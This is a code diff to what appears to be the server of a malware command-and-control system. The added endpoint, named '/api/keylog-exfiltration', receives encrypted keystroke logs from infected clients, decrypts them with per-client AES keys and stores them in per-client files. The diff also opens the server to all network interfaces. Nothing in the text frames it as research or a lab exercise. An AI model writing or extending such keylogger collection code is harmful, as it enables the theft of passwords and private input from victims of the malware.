@@ -795,6 +795,33 @@ def receive_result():
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
+keylog_directory = "KEYLOG_DIR"
+os.makedirs(keylog_directory, exist_ok=True)
+
+@app.route('/api/keylog-exfiltration', methods=['POST'])
+def keylog_exfiltration():
+    payload = request.form.get('payload')
+    if payload:
+        decoded_keylog_data = base64.b64decode(payload).decode()
+        decoded_keylog_data_in_json = json.loads(decoded_keylog_data)
+        client_id = decoded_keylog_data_in_json.get("clientid")
+        payload = decoded_keylog_data_in_json.get("data")
+        aes_key = get_aes_key_by_client_id(client_id)
+        decoded_payload = base64.b64decode(payload).decode()
+        decoded_payload_in_json = json.loads(decoded_payload)
+        nonce_hex = decoded_payload_in_json.get("nonce")
+        ciphertext_hex = decoded_payload_in_json.get("ciphertext")
+        tag_hex = decoded_payload_in_json.get("tag")
+        decrypted_keylog_data = decrypt_data(aes_key,nonce_hex,ciphertext_hex,tag_hex).decode()
+        file_path = os.path.join(keylog_directory, f"{client_id}-keylog.txt")
+        with open(file_path, "a") as file:
+            file.write(decrypted_keylog_data)
+
+
+        return 'Payload received', 200
+    else:
+        return 'No payload provided', 400
+
 
 @app.route("/super-admin-panel")
 @token_required
@@ -1042,5 +1069,5 @@ if __name__ == '__main__':
     # Generate certificates using OpenSSL for local testing
     # openssl req -x509 -nodes -days 365 -newkey rsa:4096 -keyout key.pem -out cert.pem -config config/localhost.cnf
 
-    socketio.run(app, host='localhost', port=5000, ssl_context=('cert.pem', 'key.pem'))
+    socketio.run(app, host='0.0.0.0', port=5000, ssl_context=('cert.pem', 'key.pem'))
 
